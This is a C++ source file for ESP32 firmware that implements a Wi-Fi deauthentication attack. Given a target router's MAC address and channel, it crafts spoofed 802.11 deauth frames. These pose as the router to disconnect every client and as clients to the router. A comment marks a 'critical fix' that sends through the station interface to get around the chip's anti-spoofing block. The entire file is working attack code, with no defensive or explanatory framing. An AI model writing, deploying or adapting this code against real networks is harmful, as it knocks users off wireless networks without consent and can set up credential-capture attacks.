#include <string.h>
#include <stdio.h>
#include "esp_log.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "WifiDeauth.hpp"
#include "wifi_pkt.h"

bool WifiDeauth::open() {
    unsigned int mac[6];
    int ch = 1;
    
    // Parse the MAC address and Channel from the string
    if (sscanf(targetSsid.c_str(), "%x:%x:%x:%x:%x:%x,%d", 
        &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5], &ch) == 7) {
        
        for(int i = 0; i < 6; i++) {
            spoofed_bssid[i] = (uint8_t)mac[i];
        }
        
        // Lock onto the target's frequency
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        return true;
    }
    return false; 
}

bool WifiDeauth::sendDeauth() {
    wifi_deauth_deaus_body_t pkt;
    memset(&pkt, 0, sizeof(pkt));
    
    // Frame Control: Management (0), Deauth (12 -> 0xC0)
    pkt.frame_ctrl.type = 0; 
    pkt.frame_ctrl.subtype = 12; 
    
    // -------------------------------------------------------------
    // BURST 1: Router telling all clients to disconnect (Reason 7)
    // -------------------------------------------------------------
    memset(pkt.dest_address, 0xFF, 6);            // Broadcast to all
    memcpy(pkt.src_address, spoofed_bssid, 6);    // Pretend to be Router
    memcpy(pkt.bssid, spoofed_bssid, 6);          // Router BSSID
    pkt.seq_ctrl.seq_num = seq_num++;
    pkt.reason = 7; 
    
    // CRITICAL FIX: Send via WIFI_IF_STA to bypass ESP32 AP anti-spoofing blocks
    esp_err_t res1 = esp_wifi_80211_tx(WIFI_IF_STA, &pkt, sizeof(pkt), false);

    // -------------------------------------------------------------
    // BURST 2: Router telling all clients to disconnect (Reason 1)
    // -------------------------------------------------------------
    pkt.reason = 1; 
    pkt.seq_ctrl.seq_num = seq_num++;
    esp_wifi_80211_tx(WIFI_IF_STA, &pkt, sizeof(pkt), false);

    // -------------------------------------------------------------
    // BURST 3: Clients telling the Router they are disconnecting
    // -------------------------------------------------------------
    memcpy(pkt.dest_address, spoofed_bssid, 6);   // Target the Router
    memset(pkt.src_address, 0xFF, 6);             // Pretend to be everyone
    memcpy(pkt.bssid, spoofed_bssid, 6);          // Router BSSID
    pkt.reason = 1;
    pkt.seq_ctrl.seq_num = seq_num++;
    esp_err_t res2 = esp_wifi_80211_tx(WIFI_IF_STA, &pkt, sizeof(pkt), false);

    return (res1 == ESP_OK && res2 == ESP_OK);
}

void WifiDeauth::close() { }
